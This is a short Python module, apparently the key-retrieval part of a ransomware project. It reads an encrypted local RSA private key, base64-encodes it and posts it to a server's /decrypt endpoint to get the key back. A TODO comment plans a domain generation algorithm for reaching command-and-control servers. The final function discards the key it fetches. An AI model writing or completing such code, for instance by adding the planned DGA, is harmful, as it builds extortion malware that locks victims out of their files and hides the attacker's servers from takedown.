import requests
import utils
from base64 import b64encode, b64decode
from config import ENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION


def build_request():
    encrypted_local_rsa_key_parts = utils.read_data_from_file(
        ENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION, serialized=False
    )
    body = {
        "payload": [
            b64encode(part).decode("ascii") for part in encrypted_local_rsa_key_parts
        ]
    }

    return body


def send_request(server, body):
    response = requests.post(url=f"{server}/decrypt", json=body)
    response = response.json()
    return b64decode(response.get("key"))


def get_decrypted_key_from_server():
    # TODO: ADD DGA Algorithm
    body = build_request()
    send_request(server="http://localhost:5000", body=body)

